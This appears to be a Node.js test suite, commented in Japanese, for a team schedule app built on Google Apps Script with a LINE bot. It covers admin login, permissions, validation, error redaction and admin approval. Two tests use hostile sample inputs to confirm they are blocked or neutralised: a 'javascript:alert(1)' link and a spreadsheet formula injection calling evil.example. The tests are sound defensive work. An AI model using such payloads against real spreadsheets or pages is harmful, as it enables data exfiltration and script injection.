// 管理ページの API（doPost）と公開カレンダーの API（doGet ?action=plans）
"use strict";
const { makeGas, planRow } = require("./helpers");
const test = require("node:test");
const assert = require("node:assert");

const ADMIN = "U_ADMIN";
const lineFetch = (userId = ADMIN) => (url) => {
  const { response } = require(require("node:path").join(process.env.HOME, "GitHub/q-oqrn/tools/qtest/fake-gas.js"));
  if (/oauth2\/v2\.1\/verify/.test(url)) {
    if (/access_token=bad/.test(url)) return response(400, { error: "invalid_request" });
    return response(200, { client_id: "2009927582", expires_in: 3600, scope: "profile openid" });
  }
  if (/v2\/profile/.test(url)) return response(200, { userId, displayName: "山田" });
  return undefined;
};

const make = (o = {}) => makeGas(Object.assign({
  now: "2026-10-23T08:00:00+09:00",
  properties: { ADMIN_USER_IDS: `U_OTHER, ${ADMIN}` },
  fetch: lineFetch(o.userId),
  plans: [
    planRow("2026-10-24", "10:00", "12:00", "公園", "練習", "", "https://example.com/oct"),
    planRow("2026-11-02", "10:00", "", "体育館", "試合"),
  ],
}, o));

const record = (over = {}) => Object.assign({ date: "2026-11-05", start: "18:00", end: "20:00", place: "体育館", memo1: "練習", memo2: "", link: "" }, over);

test("本人確認：ログイン情報なし・期限切れは断る", () => {
  const gas = make();
  assert.equal(gas.doPost({ action: "list" }).code, "unauthorized");
  assert.equal(gas.doPost({ action: "list", accessToken: "bad" }).code, "unauthorized");
  assert.equal(gas.doPost("{こわれた").code, "bad_request");
});

test("権限：管理者でない人は whoami だけ。一覧も書きこみもできない", () => {
  const gas = make({ userId: "U_STRANGER" });
  const me = gas.doPost({ action: "whoami", accessToken: "t" });
  assert.deepEqual([me.ok, me.userId, me.isAdmin], [true, "U_STRANGER", false]);
  // サイト作成者に送る頼む文（名前つき）。管理者には返さない
  assert.equal(me.askText, "#管理者申請 U_STRANGER\n名前: 山田\n（サイト作成者の方へ：この文をそのまま、ボットとの1対1のトークに送ると、承認のボタンが出ます）");
  assert.equal(make().doPost({ action: "whoami", accessToken: "t" }).askText, undefined);
  assert.equal(gas.doPost({ action: "list", accessToken: "t" }).code, "forbidden");
  assert.equal(gas.doPost({ action: "add", accessToken: "t", record: record() }).code, "forbidden");
  assert.equal(gas.plan.rows.length, 3);
});

test("管理者：一覧・追加（同じ月のリンクで補う）・編集・削除", () => {
  const gas = make();
  const list = gas.doPost({ action: "list", accessToken: "t" });
  assert.equal(list.records.length, 2);

  const added = gas.doPost({ action: "add", accessToken: "t", record: record({ date: "2026-10-30" }) });
  assert.equal(added.ok, true);
  const newRow = added.records.find((r) => r.date === "2026-10-30");
  assert.equal(newRow.link, "https://example.com/oct");

  const updated = gas.doPost({ action: "update", accessToken: "t", rowNumber: newRow.rowNumber, expected: newRow, record: record({ date: "2026-10-30", memo1: "試合" }) });
  assert.equal(updated.ok, true);
  assert.equal(gas.plan.rows[newRow.rowNumber - 1][4], "試合");

  const latest = updated.records.find((r) => r.rowNumber === newRow.rowNumber);
  const deleted = gas.doPost({ action: "delete", accessToken: "t", rowNumber: latest.rowNumber, expected: latest });
  assert.equal(deleted.ok, true);
  assert.equal(gas.plan.rows.length, 3);
});

test("管理者：画面が見ていた行とシートがちがえば、編集・削除しない", () => {
  const gas = make();
  const list = gas.doPost({ action: "list", accessToken: "t" });
  const stale = Object.assign({}, list.records[0], { memo1: "ちがう" });
  assert.equal(gas.doPost({ action: "delete", accessToken: "t", rowNumber: stale.rowNumber, expected: stale }).code, "stale");
  assert.equal(gas.doPost({ action: "delete", accessToken: "t", rowNumber: 99, expected: stale }).code, "stale");
  assert.equal(gas.plan.rows.length, 3);
});

test("管理者：入力の確かめ（ない日付・時刻・リンク）", () => {
  const gas = make();
  const bad = (over) => gas.doPost({ action: "add", accessToken: "t", record: record(over) });
  assert.equal(bad({ date: "2026-02-30" }).code, "invalid");
  assert.equal(bad({ start: "25:00" }).code, "invalid");
  assert.equal(bad({ end: "x" }).code, "invalid");
  assert.equal(bad({ link: "javascript:alert(1)" }).code, "invalid"); // qcheck-ok: W8 テストの文字
  assert.equal(bad({ memo1: "" }).code, "invalid");
  assert.equal(bad({ place: "あ".repeat(201) }).code, "invalid");
  assert.equal(bad({ link: "https://example.com/" + "a".repeat(2000) }).code, "invalid");
  assert.equal(gas.plan.rows.length, 3);
});

test("管理者：シートで式として動く文字は、文字のまま書く", () => {
  const gas = make();
  gas.doPost({ action: "add", accessToken: "t", record: record({ place: '=IMPORTXML("https://evil.example","//a")', memo1: "+1", memo2: "@x" }) });
  const preview = gas.doPost({ action: "parseSchedule", accessToken: "t", text: "11/6\t10:00\t12:00\t-場所\t=内容" });
  gas.doPost({ action: "addBatch", accessToken: "t", records: preview.records });
  assert.equal(gas.plan.rows.length, 5);
  assert.deepEqual(gas.formulaCells(), []);
  // 一覧では、元の文字のまま見える（先頭の ' はシートが隠す）
  const list = gas.doPost({ action: "list", accessToken: "t" });
  assert.ok(list.records.some((r) => r.memo1 === "'+1" || r.memo1 === "+1"));
});

test("文章でまとめて追加：確認は書きこまず、登録済みと同じ予定には印を付ける", () => {
  const gas = make();
  const preview = gas.doPost({ action: "parseSchedule", accessToken: "t", text: "10/24 10:00〜12:00 公園 練習\n11/7 10:00〜 公園 練習\n2/30 10:00〜12:00 公園 練習" });
  assert.equal(preview.ok, true);
  assert.deepEqual(preview.records.map((r) => r.duplicate), [true, false]);
  assert.equal(preview.records[1].end, "12:00");
  assert.equal(preview.errors.length, 1);
  assert.equal(preview.errors[0].lineNumber, 3);
  assert.equal(gas.plan.rows.length, 3);
});

test("文章でまとめて追加：1件でもまちがいがあれば、1件も書かない", () => {
  const gas = make();
  const res = gas.doPost({ action: "addBatch", accessToken: "t", records: [record(), record({ start: "" })] });
  assert.equal(res.code, "invalid");
  assert.match(res.message, /2件目/);
  assert.equal(gas.plan.rows.length, 3);
});

test("月の共通リンク：空の行と、これまでの共通リンクの行だけ変える", () => {
  const gas = make({
    plans: [
      planRow("2026-11-01", "10:00", "12:00", "A", "練習", "", "https://example.com/old"),
      planRow("2026-11-02", "10:00", "12:00", "B", "練習", "", ""),
      planRow("2026-11-03", "10:00", "12:00", "C", "練習", "", "https://example.com/own"),
      planRow("2026-12-01", "10:00", "12:00", "D", "練習", "", ""),
    ],
  });
  gas.doPost({ action: "setMonthLink", accessToken: "t", month: "2026-11", fromLink: "https://example.com/old", link: "https://example.com/new" });
  assert.deepEqual(gas.plan.rows.slice(1).map((r) => r[6]), ["https://example.com/new", "https://example.com/new", "https://example.com/own", ""]);
});

test("思わぬエラーの中身（設定の名前など）は、画面に返さない", () => {
  const gas = make();
  gas.ctx.SHEETS.Plan.getDataRange = () => { throw new Error("Exception: SHEET_ID 1abcSECRET にアクセスできません"); };
  const res = gas.doPost({ action: "list", accessToken: "t" });
  assert.equal(res.ok, false);
  assert.doesNotMatch(JSON.stringify(res), /SECRET/);
  // 自分で決めた言葉（ログインの期限切れなど）は、そのまま返す
  assert.match(gas.doPost({ action: "list", accessToken: "bad" }).message, /開き直して/);
});

test("公開カレンダー：今月1日からの予定を返し、エラーの中身は出さない", () => {
  const gas = make({
    plans: [
      planRow("2026-09-30", "10:00", "12:00", "先月", "練習"),
      planRow("2026-10-01", "10:00", "12:00", "今月の過ぎた日", "練習"),
      planRow("2026-11-02", "10:00", "12:00", "来月", "練習"),
    ],
  });
  const res = gas.doGet({ action: "plans" });
  assert.equal(res.ok, true);
  assert.deepEqual(res.records.map((r) => r.place), ["今月の過ぎた日", "来月"]);
  assert.equal(res.subscribeUrl, "");

  const broken = make();
  broken.ctx.SHEETS.Plan.getDataRange = () => { throw new Error("SECRET_DETAIL"); };
  const out = broken.doGet({});
  assert.equal(out.ok, false);
  assert.doesNotMatch(JSON.stringify(out), /SECRET/);
});

test("公開カレンダー：個人のカレンダー（メールアドレスの ID）なら登録リンクを出さない", () => {
  const personal = make({ properties: { ADMIN_USER_IDS: ADMIN, CALENDAR_ID: "someone@gmail.com" } });
  assert.equal(personal.doGet({ action: "plans" }).subscribeUrl, "");
  const shared = make({ properties: { ADMIN_USER_IDS: ADMIN, CALENDAR_ID: "abc@group.calendar.google.com" } });
  assert.match(shared.doGet({ action: "plans" }).subscribeUrl, /^https:\/\/calendar\.google\.com\/calendar\/u\/0\?cid=/);
});

test("「⚽ 空き」：管理者だけ。今日から90日ぶんと、ほかの場所の予定を返す（予定は書きかえない）", () => {
  const { response } = require(require("node:path").join(process.env.HOME, "GitHub/q-oqrn/tools/qtest/fake-gas.js"));
  const frames = [{ usageTimeFrameId: 1, usageStartTime: "19:00:00", usageEndTime: "20:00:00" }];
  const site = { timeFrames: [{ usageTimeFrames: frames }], rooms: [{ roomName: "フットサルコート", courts: [
    { courtName: "コート1", dayBooks: [{ usageDate: "2026-10-24T00:00:00", usageTimes: [{ usageTimeFrameId: 1, statusType: "A01" }] }] },
  ] }] };
  const fetch = (userId) => (url) => (/GetDay/.test(url) ? response(200, site) : lineFetch(userId)(url));
  const gas = make({ fetch: fetch(ADMIN) });
  const res = gas.doPost({ action: "availability", accessToken: "t" });
  assert.equal(res.ok, true);
  assert.equal(res.availability.status, "ok");
  assert.match(res.availability.pageUrl, /sd=2026-10-23.*ed=2027-01-20/);
  assert.deepEqual(res.availability.days.map((d) => [d.date, d.open]), [["2026-10-24", true]]);
  // ほかの場所の予定は、表に出ている日のぶんだけ添える（11/2 は表にない）
  assert.deepEqual(res.availability.elsewhere, [{ date: "2026-10-24", start: "10:00", end: "12:00", place: "公園", memo1: "練習" }]);
  assert.equal(make({ fetch: fetch("U_STRANGER"), userId: "U_STRANGER" }).doPost({ action: "availability", accessToken: "t" }).code, "forbidden");
});

test("「⚽ 空き」：サイトの返事は1時間しまって使う。「読みなおす」（fresh）ならすぐ読む。読めなければ前の分（stale）", () => {
  const { response } = require(require("node:path").join(process.env.HOME, "GitHub/q-oqrn/tools/qtest/fake-gas.js"));
  const frames = [{ usageTimeFrameId: 1, usageStartTime: "19:00:00", usageEndTime: "20:00:00" }];
  // 部屋の名前を長くして、返事を CacheService の1つの値（100KB）より大きくする（分けてしまえるか）
  const site = { timeFrames: [{ usageTimeFrames: frames }], rooms: [{ roomName: "フットサルコート", note: "あ".repeat(70000), courts: [
    { courtName: "コート1", dayBooks: [{ usageDate: "2026-10-24T00:00:00", usageTimes: [{ usageTimeFrameId: 1, statusType: "A01" }] }] },
  ] }] };
  let calls = 0;
  let down = false;
  const gas = make({ fetch: (url) => {
    if (!/GetDay/.test(url)) return lineFetch(ADMIN)(url);
    calls++;
    return down ? response(503, {}) : response(200, site);
  } });
  const read = (fresh) => gas.doPost({ action: "availability", accessToken: "t", fresh }).availability;
  assert.match(read().asOf, /^2026-10-23T08:00/);
  gas.setNow("2026-10-23T08:50:00+09:00");
  assert.match(read().asOf, /^2026-10-23T08:00/); // しまった返事。時刻は取った時刻
  assert.equal(calls, 1);
  assert.match(read(true).asOf, /^2026-10-23T08:50/); // 読みなおす
  assert.equal(calls, 2);
  gas.setNow("2026-10-23T10:00:00+09:00");
  down = true;
  const stale = read();
  assert.equal(stale.status, "ok");
  assert.equal(stale.stale, true);
  assert.match(stale.asOf, /^2026-10-23T08:50/);
});

test("管理者の申請：サイト作成者がボットに送ると「承認する」が出て、押すと ADMIN_USER_IDS に足す。ほかの人は足せない", () => {
  const OWNER = "U" + "a".repeat(32);
  const NEWBIE = "U" + "b".repeat(32);
  const gas = make({ properties: { ADMIN_USER_IDS: ADMIN, OWNER_USER_IDS: OWNER } });
  const say = (text, userId, type = "user") => require("./helpers").plain(gas.call("handleTextMessage", { type: "message", source: { type, userId, groupId: type === "group" ? "G1" : undefined }, message: { type: "text", text } }));
  const ask = `#管理者申請 ${NEWBIE}\n名前: 山田\n（サイト作成者の方へ：この文をそのまま、ボットとの1対1のトークに送ると、承認のボタンが出ます）`;

  // 管理者でもサイト作成者でない人は足せない
  assert.match(say(ask, ADMIN)[0].text, /サイト作成者だけ/);
  assert.match(say(`#管理者承認 ${NEWBIE}`, ADMIN)[0].text, /サイト作成者だけ/);
  assert.equal(gas.properties.ADMIN_USER_IDS, ADMIN);

  // グループでは承認しない（承認のボタンがほかの人にも見えるため）
  assert.match(say(ask, OWNER, "group")[0].text, /1対1のトーク/);
  assert.match(say(`#管理者承認 ${NEWBIE}`, OWNER, "group")[0].text, /1対1のトーク/);
  assert.equal(gas.properties.ADMIN_USER_IDS, ADMIN);

  const reply = say(ask, OWNER);
  assert.match(reply[0].text, /管理者にしますか/);
  assert.match(reply[0].text, /名前: 山田/);
  assert.deepEqual(reply[0].quickReply.items.map((i) => [i.action.label, i.action.text]), [["🔑承認する", `#管理者承認 ${NEWBIE}`]]);
  assert.match(say(reply[0].quickReply.items[0].action.text, OWNER)[0].text, /管理者にしました/);
  assert.equal(gas.properties.ADMIN_USER_IDS, `${ADMIN},${NEWBIE}`);
  // もう一度押しても、2回は足さない
  assert.match(say(`#管理者承認 ${NEWBIE}`, OWNER)[0].text, /もう管理者です/);
  assert.equal(gas.properties.ADMIN_USER_IDS, `${ADMIN},${NEWBIE}`);
  // ID が読めないときは例を返す
  assert.match(say("#管理者申請 だれか", OWNER)[0].text, /例:\n#管理者申請 U/);
});

test("🔑 シートはサイト作成者だけ：作成者がボットとの1対1で送った返事にだけ「🔑シート」を足す。グループ・ほかの人・#テスト には出さない", () => {
  const OWNER = "U" + "a".repeat(32);
  const gas = make({ properties: { ADMIN_USER_IDS: `${ADMIN},${OWNER}`, OWNER_USER_IDS: OWNER } });
  const say = (text, userId, type = "user") => require("./helpers").plain(gas.call("handleTextMessage", { type: "message", source: { type, userId, groupId: type === "group" ? "G1" : undefined }, message: { type: "text", text } }));
  const labels = (reply) => reply[reply.length - 1].quickReply.items.map((i) => i.action.label);
  assert.deepEqual(labels(say("#今後の予定", OWNER)), ["リッチに送る", "予定を管理", "カレンダー", "予定", "🔑シート"]);
  assert.deepEqual(labels(say("#今後の予定", OWNER, "group")), ["リッチに送る", "予定を管理", "カレンダー", "予定"]);
  assert.deepEqual(labels(say("#今後の予定", ADMIN)), ["リッチに送る", "予定を管理", "カレンダー", "予定"]);
  assert.ok(!labels(say("#予定登録", OWNER)).includes("シート"));
  assert.ok(labels(say("#予定登録", OWNER)).includes("🔑シート"));
  assert.ok(!labels(say("#テスト", OWNER)).includes("🔑シート"));
  // 予定がないときの文にも、シートのリンクを書かない
  const empty = make({ plans: [], properties: { ADMIN_USER_IDS: ADMIN, OWNER_USER_IDS: OWNER } });
  const none = require("./helpers").plain(empty.call("handleTextMessage", { type: "message", source: { type: "group", groupId: "G1", userId: ADMIN }, message: { type: "text", text: "#今後の予定" } }));
  assert.match(none[0].text, /まだありません/);
  assert.doesNotMatch(JSON.stringify(none), /docs\.google/);
});
